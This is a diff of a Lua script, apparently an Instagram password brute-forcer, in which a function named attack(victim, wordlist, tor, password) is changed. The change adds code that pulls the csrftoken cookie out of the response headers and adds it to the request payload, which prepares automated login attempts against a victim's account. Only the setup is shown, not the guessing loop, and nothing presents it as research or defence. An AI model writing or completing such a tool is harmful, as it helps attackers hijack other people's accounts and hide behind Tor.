@@ -35,19 +35,27 @@ local request_headers = {
      ["Referer"] = instagram_url
 }
 local function wait(time)
-    timer = os.time()
+    local timer = os.time()
     repeat until os.time() > timer + time
 end
 
 local function attack(victim, wordlist, tor, password)
 	local request_response = {}
-	local body, code, headers = http.request {
+	local code, body ,headers = http.request {
 		url = instagram_url,
 		method = "GET",
 		headers = request_headers,
 		--source = ltn12.source.string(request_payload),
 		sink = ltn12.sink.table(request_response)
 	}
+	for _,cooks in pairs(headers) do
+		if cooks:find("csrftoken") then
+			local csrf = cooks:match('csrftoken=.*'):sub(1, -485):sub(11,-1)
+			request_payload = request_payload .. "&x-csrftoken=" .. csrf
+			print(request_payload)
+			break
+		end
+	end
 end
 
 local function main()
